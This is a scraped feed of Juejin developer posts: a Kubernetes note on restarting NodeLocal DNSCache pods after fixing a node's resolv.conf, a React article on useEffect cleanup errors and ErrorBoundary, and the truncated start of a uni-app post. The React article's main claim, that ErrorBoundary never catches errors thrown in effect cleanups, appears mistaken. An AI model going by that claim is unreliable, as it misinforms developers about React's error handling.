pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>因为 NodeLocal DNSCache 未加载更新后的节点 resolv.conf 导致 Pod 无法解析外部域名</strong></p>
<hr/>
<h2 data-id="heading-0">一、问题现象</h2>
<p>在 Kubernetes 集群中，部署的应用 Pod 在调度到 <strong>worker4 节点</strong>时可以正常访问外部服务 <code>qyapi.weixin.qq.com</code>，但当调度到 <strong>worker3 节点</strong>时，Java 应用抛出如下异常：</p>
<pre><code class="hljs language-csharp" lang="csharp">Caused <span class="hljs-keyword">by</span>: java.net.UnknownHostException: qyapi.weixin.qq.com
</code></pre>
<p>经初步排查：</p>
<ul>
<li>worker3 节点本身可通过 <code>ping qyapi.weixin.qq.com</code> 正常解析并连通；</li>
<li>worker4 节点无此问题；</li>
<li>两节点操作系统及网络环境基本一致。</li>
</ul>
<hr/>
<h2 data-id="heading-1">二、根因分析</h2>
<h3 data-id="heading-2">1. 集群启用了 NodeLocal DNSCache</h3>
<p>通过检查发现，集群部署了 <strong>NodeLocal DNSCache</strong>（DaemonSet，标签 <code>k8s-app=nodelocaldns</code>），用于优化 Pod 的 DNS 查询性能。其工作原理如下：</p>
<ul>
<li>每个节点运行一个本地 CoreDNS 实例，监听 IP（通常为 <code>169.254.20.10</code>）；</li>
<li>Pod 的 <code>/etc/resolv.conf</code> 中 <code>nameserver</code> 被设置为此本地地址；</li>
<li>NodeLocal DNSCache 将集群内部域名请求转发给 CoreDNS，外部域名请求则转发给<strong>节点 <code>/etc/resolv.conf</code> 中配置的上游 DNS 服务器</strong>。</li>
</ul>
<h3 data-id="heading-3">2. NodeLocal DNSCache 仅在启动时读取 <code>/etc/resolv.conf</code></h3>
<ul>
<li>NodeLocal DNSCache Pod <strong>在启动时读取所在节点的 <code>/etc/resolv.conf</code></strong>，获取上游 DNS 配置；</li>
<li><strong>不会动态监听或重新加载该文件的后续变更</strong>；</li>
<li>若节点的 DNS 配置发生变化（如修复错误配置），必须<strong>重启 NodeLocal DNSCache Pod</strong> 才能生效。</li>
</ul>
<h3 data-id="heading-4">3. 问题发生过程</h3>
<ol>
<li>worker3 节点初始的 <code>/etc/resolv.conf</code> 配置有误（如 nameserver 不可达）；</li>
<li>NodeLocal DNSCache Pod 启动时加载了错误的上游 DNS 配置；</li>
<li>即使后续手动修正了 worker3 的 <code>/etc/resolv.conf</code>，NodeLocal DNSCache 仍使用旧配置；</li>
<li>导致调度到 worker3 的 Pod 无法解析外部域名，而节点自身（直接使用 <code>/etc/resolv.conf</code>）可正常解析。</li>
</ol>
<hr/>
<h2 data-id="heading-5">三、解决方案</h2>
<h3 data-id="heading-6">✅ 步骤 1：确保节点 DNS 配置正确</h3>
<p>将 worker3 的 <code>/etc/resolv.conf</code> 修改为与正常节点（如 worker4）一致，例如：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 注意这里，修改为与正常节点（如 worker4）一致</span>
nameserver <span class="hljs-number">114.114</span><span class="hljs-number">.114</span><span class="hljs-number">.114</span>

</code></pre>
<blockquote>
<p>💡 建议通过系统级网络管理工具（如 NetworkManager、systemd-resolved）进行持久化配置，避免被 DHCP 或云平台覆盖。</p>
</blockquote>
<h3 data-id="heading-7">✅ 步骤 2：重启 NodeLocal DNSCache Pod</h3>
<p>强制重建 worker3 上的 NodeLocal DNSCache 实例，使其加载最新的 <code>/etc/resolv.conf</code>：</p>
<pre><code class="hljs language-ini" lang="ini">kubectl delete pods -n kube-system -l <span class="hljs-attr">k8s-app</span>=nodelocaldns
</code></pre>
<p>Kubernetes DaemonSet 控制器会自动在所有节点（包括 worker3）上创建新的 Pod。</p>
<h3 data-id="heading-8">✅ 步骤 3：验证修复结果</h3>
<p>在 worker3 上部署测试 Pod，验证外部域名解析：</p>
<pre><code class="hljs language-ini" lang="ini">kubectl run debug <span class="hljs-attr">--image</span>=busybox:<span class="hljs-number">1.28</span> --rm -it --restart=Never \
  <span class="hljs-attr">--overrides</span>=<span class="hljs-string">'{"spec":{"nodeSelector":{"kubernetes.io/hostname":"worker3"}}}'</span> \
  -- nslookup qyapi.weixin.qq.com
</code></pre>
<p>预期输出应包含有效的 IP 地址，无超时或错误。</p>
<hr/>
<h2 data-id="heading-9">四、经验总结与建议</h2>

























<table><thead><tr><th>项目</th><th>说明</th></tr></thead><tbody><tr><td><strong>关键认知</strong></td><td>NodeLocal DNSCache <strong>不会动态重载</strong> <code>/etc/resolv.conf</code>，修改后必须重启 Pod</td></tr><tr><td><strong>运维规范</strong></td><td>修改节点 DNS 配置后，应同步执行 <code>kubectl delete pod -n kube-system -l k8s-app=nodelocaldns</code></td></tr><tr><td><strong>配置持久化</strong></td><td>避免直接编辑 <code>/etc/resolv.conf</code>，推荐使用系统网络管理工具或云平台配置</td></tr><tr><td><strong>监控建议</strong></td><td>可通过 Prometheus + CoreDNS 指标监控 DNS 解析失败率，提前发现类似问题</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-10">五、附录：相关组件说明</h2>
<h3 data-id="heading-11">NodeLocal DNSCache 架构简图</h3>
<pre><code class="hljs language-scss" lang="scss">Pod (nameserver: <span class="hljs-number">169.254</span>.<span class="hljs-number">20.10</span>)
        ↓
NodeLocal DNSCache (本地 CoreDNS, 运行于每个节点)
        ↓
上游 DNS（来自节点 /etc/resolv<span class="hljs-selector-class">.conf</span>）
        ↓
公网/内网 DNS 服务器
</code></pre>
<h3 data-id="heading-12">查看 NodeLocal DNSCache 配置</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta"># 查看 ConfigMap</span>
kubectl <span class="hljs-keyword">get</span> cm nodelocaldns -n kube-system -o yaml

<span class="hljs-meta"># 查看 Pod 状态</span>
kubectl <span class="hljs-keyword">get</span> pods -n kube-system -l k8s-app=nodelocaldns -o wide
</code></pre>
<hr/>
<p><strong>记录人</strong>：壹米饭
<strong>记录时间</strong>：2025年12月5日<br/>
<strong>适用环境</strong>：启用 NodeLocal DNSCache 的 Kubernetes 集群（v1.18+）</p>
<blockquote>
<p>📌 <strong>一句话总结</strong>：改了节点 DNS 配置？别忘了重启 nodelocaldns！</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[函数组件 useEffect 清理函数抛错：ErrorBoundary 能捕获吗？]]></title>    <link>https://juejin.cn/post/7579961957221007387</link>    <guid>https://juejin.cn/post/7579961957221007387</guid>    <pubDate>2025-12-05T03:09:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579961957221007387" data-draft-id="7579917791764660251" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="函数组件 useEffect 清理函数抛错：ErrorBoundary 能捕获吗？"/> <meta itemprop="keywords" content="前端,React.js"/> <meta itemprop="datePublished" content="2025-12-05T03:09:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="xiechao"/> <meta itemprop="url" content="https://juejin.cn/user/377887728340302"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            函数组件 useEffect 清理函数抛错：ErrorBoundary 能捕获吗？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/377887728340302/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    xiechao
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:09:23.000Z" title="Fri Dec 05 2025 03:09:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">函数组件 useEffect 清理函数抛错：ErrorBoundary 能捕获吗？</h2>
<p>在函数组件中，useEffect 的返回方法（通常称为 “清理函数”）承担着类似类组件 componentWillUnmount 的职责，比如取消定时器、清除订阅、终止未完成的接口请求等。最近有开发者问：“如果在这个清理函数里不小心抛出了错误，ErrorBoundary 能捕获到吗？” 这个问题恰好卡在 ErrorBoundary 的 “能力边界” 上，我们结合之前讲过的限制来拆解分析。</p>
<h4 data-id="heading-1">先给结论：清理函数中的错误，ErrorBoundary 无法捕获</h4>
<p>要理解原因，得先回顾两个关键前提：</p>
<ol>
<li>ErrorBoundary 仅能捕获 <strong>子组件渲染、生命周期（类组件）、构造函数中的同步错误</strong>；</li>
</ol>

<ol start="2">
<li>useEffect 清理函数的执行时机，是在组件卸载时或依赖项更新导致 effect 重新执行前 —— 这个时机<strong>脱离了组件的 “渲染流程”</strong> ，属于 “组件销毁 / 更新后的收尾操作”，和我们之前讲的 “异步操作错误”“事件处理错误” 本质上是同一类：不在 ErrorBoundary 的监控范围内。</li>
</ol>
<h4 data-id="heading-2">用实例验证：清理函数抛错会直接崩溃</h4>
<p>我们写一段代码来模拟这个场景：在 useEffect 清理函数中故意抛出错误，看看 ErrorBoundary 是否生效。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. 先定义基础的 ErrorBoundary 组件（复用之前的逻辑）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ErrorBoundary</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> {
  state = { <span class="hljs-attr">hasError</span>: <span class="hljs-literal">false</span> };
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">getDerivedStateFromError</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">hasError</span>: <span class="hljs-literal">true</span> };
  }
  <span class="hljs-title function_">componentDidCatch</span>(<span class="hljs-params">error</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'ErrorBoundary 捕获到错误：'</span>, error);
  }
  <span class="hljs-title function_">render</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">hasError</span>) <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>页面出错了，但被捕获了~<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">children</span>;
  }
}
<span class="hljs-comment">// 2. 函数组件：在 useEffect 清理函数中抛错</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">CleanupErrorComponent</span>(<span class="hljs-params"/>) {
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// effect 执行逻辑（空）</span>
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-comment">// 组件卸载时执行的清理函数，故意抛错</span>
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'useEffect 清理函数出错了！'</span>);
    };
  }, []);
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>我是一个会在卸载时抛错的组件<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
}
<span class="hljs-comment">// 3. 父组件：用 ErrorBoundary 包裹目标组件，并加卸载触发按钮</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">ParentComponent</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [showChild, setShowChild] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">true</span>);
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setShowChild(false)}&gt;卸载子组件<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">ErrorBoundary</span>&gt;</span>
        {showChild &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">CleanupErrorComponent</span> /&gt;</span>}
      <span class="hljs-tag">&lt;/<span class="hljs-name">ErrorBoundary</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<p>当点击 “卸载子组件” 时，CleanupErrorComponent 触发清理函数并抛错 —— 此时控制台会打印红色错误，但 ErrorBoundary 没有渲染 “页面出错了，但被捕获了～” 的备用 UI，反而可能导致页面功能异常（比如按钮点击无响应）。</p>
<p>这就证明了：<strong>useEffect 清理函数中的错误，完全绕过了 ErrorBoundary 的捕获机制</strong>。</p>
<h4 data-id="heading-3">为什么会这样？从 React 执行流程看本质</h4>
<p>React 处理 useEffect 清理函数的逻辑，属于 “commit 阶段” 后的收尾操作：</p>
<ol>
<li>当组件需要卸载时，React 先完成 “DOM 移除”“状态更新” 等核心渲染流程；</li>
</ol>

<ol start="2">
<li>核心流程结束后，才会异步执行 useEffect 的清理函数；</li>
</ol>

<ol start="3">
<li>此时 ErrorBoundary 对该组件的 “渲染监控” 已经结束 —— 毕竟组件都从 DOM 树上移除了，ErrorBoundary 自然无法感知后续的错误。</li>
</ol>
<p>简单说：ErrorBoundary 只 “盯着” 组件 “活着” 时的渲染相关操作，组件 “死了” 之后（卸载后）的清理函数抛错，它管不着。</p>
<h4 data-id="heading-4">解决方案：手动用 try/catch 包裹清理函数</h4>
<p>既然 ErrorBoundary 不管用，那该如何处理清理函数中的错误？答案和处理 “事件处理错误”“异步错误” 一致 ——<strong>主动用 try/catch 捕获</strong>。</p>
<p>修改后的清理函数代码：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 用 try/catch 包裹所有可能抛错的逻辑</span>
    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// 比如：取消接口请求、清除定时器等可能出错的操作</span>
      <span class="hljs-keyword">const</span> invalidJson = <span class="hljs-string">'这不是合法的JSON'</span>;
      <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(invalidJson); <span class="hljs-comment">// 这里会抛错</span>
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-comment">// 错误处理：打印日志、上报监控平台，避免崩溃</span>
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'useEffect 清理函数出错（已捕获）：'</span>, error);
      <span class="hljs-comment">// 可选：如果需要用户感知，可以通过状态提示（但注意组件已卸载，需谨慎）</span>
      <span class="hljs-comment">// 比如：用一个全局状态管理错误提示，而非组件自身状态</span>
    }
  };
}, []);
</code></pre>
<p>这里有个注意点：清理函数中不要更新组件自身的状态（比如 setState），因为组件此时已卸载，更新状态会触发 “内存泄漏警告”。如果需要告知用户错误，可以用全局状态（如 Redux、Context）管理错误提示，在其他未卸载的组件（如顶部通知栏）中显示。</p>
<h4 data-id="heading-5">延伸：类似场景的错误处理原则</h4>
<p>除了 useEffect 清理函数，以下场景的错误也需要手动用 try/catch 处理，而非依赖 ErrorBoundary：</p>
<ul>
<li>useLayoutEffect 的清理函数（执行时机虽早于 useEffect，但同样不在渲染流程内）；</li>
</ul>

<ul>
<li>自定义 Hook 中的清理逻辑（如 useRequest 中的请求取消函数）；</li>
</ul>

<ul>
<li>组件卸载时执行的其他回调（如第三方库的销毁方法）。</li>
</ul>
<h4 data-id="heading-6">总结</h4>
<p>useEffect 返回的清理函数，虽然承担着类组件 componentWillUnmount 的职责，但它的执行时机和错误性质，决定了 ErrorBoundary 无法捕获其中的错误。处理这类错误的核心原则是：<strong>主动预判风险，用 try/catch 包裹所有可能抛错的逻辑</strong>，再配合日志上报和用户提示，才能避免应用崩溃，同时保障用户体验。</p>
<p>记住：ErrorBoundary 是 “渲染流程的守护者”，而非 “所有错误的万能药”—— 在函数组件的副作用清理中，手动捕获错误才是更可靠的方案。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[uni-app 使用 uview-plus]]></title>    <link>https://juejin.cn/post/7579893536105791494</link>    <guid>https://juejin.cn/post/7579893536105791494</guid>    <pubDate>2025-12-05T03:11:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579893536105791494" data-draft-id="7579846685071851574" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="uni-app 使用 uview-plus"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-05T03:11:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一壶纱"/> <meta itemprop="url" content="https://juejin.cn/user/897635786437944"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            uni-app 使用 uview-plus
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/897635786437944/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一壶纱
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:11:51.000Z" title="Fri Dec 05 2025 03:11:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body 